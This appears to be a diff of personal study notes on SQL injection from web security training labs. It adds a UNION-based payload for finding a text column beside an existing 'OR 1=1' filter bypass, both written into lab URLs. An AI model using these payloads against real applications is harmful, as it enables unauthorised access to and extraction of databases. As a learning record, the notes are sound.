@@ -865,8 +865,13 @@ We can also inject in value place --> 'OR 1=1 -- (It will show every data)
 
 https://0a2900cd031d3118804b0568001900d0.web-security-academy.net/filter?category=Accessories' OR 1=1 --
 __________________________________________________________________________________________________________________________________________________________________
+SQL injection UNION attack, finding a column containing text
+-------------------------------------------------------------
 
+https://0afa006f04c947e48044c24a008600e5.web-security-academy.net/filter?category=Lifestyle' UNION SELECT NULL,'abcd',NULL--
 
+In this text only the second column takes string data type
+__________________________________________________________________________________________________________________________________________________________________
 
 
 
